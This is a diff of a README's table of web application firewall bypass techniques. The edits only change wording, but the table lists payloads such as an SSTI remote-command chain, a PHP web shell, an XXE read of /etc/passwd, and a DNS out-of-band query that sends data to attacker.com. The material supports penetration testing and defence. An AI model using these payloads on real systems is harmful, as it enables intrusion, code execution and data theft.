@@ -168,24 +168,26 @@ Reports
 
 ---
 
-🛡️ BYPASS TECHNIQUES
+🛡️ BYPASS TECHNIQUE
 
 # Technique Description Example
-1 Double Encoding URL encode twice to bypass WAFs %2527%2520%254F%2552
-2 SQL Comments MySQL-specific comments bypass regex /*!50000UNION*/ SELECT
+1 Double Encoding URL encode twice to bypass WAFs that decode only once %2527%2520%254F%2552
+2 SQL Comments MySQL-specific comments bypass regex filters /*!50000UNION*/ SELECT
 3 Case Mutation Random case bypass case-sensitive filters UnIoN SeLeCt
 4 Chunked Transfer Split payload across HTTP chunks Transfer-Encoding: chunked
-5 DNS OOB Blind injection detection via DNS load_file(concat('\\\\',version(),'.attacker.com'))
+5 DNS OOB Blind injection detection via DNS queries load_file(concat('\\\\',version(),'.attacker.com'))
 6 JSONP Injection Callback parameter abuse callback=alert(1)
 7 GraphQL Introspection Dump GraphQL schema {__schema{types{name}}}
 8 JWT Alg None Bypass signature verification alg: none
 9 SSTI Chaining Template injection to RCE {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
-10 Header Injection CRLF injection in headers User-Agent: '><script>alert(1)</script>
-11 Log Poisoning Inject PHP code into logs <?php system($_GET['cmd']); ?>
+10 Header Injection CRLF injection in HTTP headers User-Agent: '><script>alert(1)</script>
+11 Log Poisoning Inject PHP code into server logs <?php system($_GET['cmd']); ?>
 12 XXE via SVG XML external entity via SVG upload <!ENTITY xxe SYSTEM "file:///etc/passwd">
-13 SSRF Parser Bypass IPv4/IPv6 variations 0.0.0.0, [::], 2130706433
+13 SSRF Parser Bypass IPv4/IPv6 variations to bypass filters 0.0.0.0, [::], 2130706433
 14 Parameter Pollution Duplicate parameters confuse WAF ?id=1&id=1' OR '1'='1
-15 TRACE Method XSS via custom headers TRACE / HTTP/1.1
+15 TRACE Method XSS via custom HTTP headers TRACE / HTTP/1.1
+
+
 
 ---
 
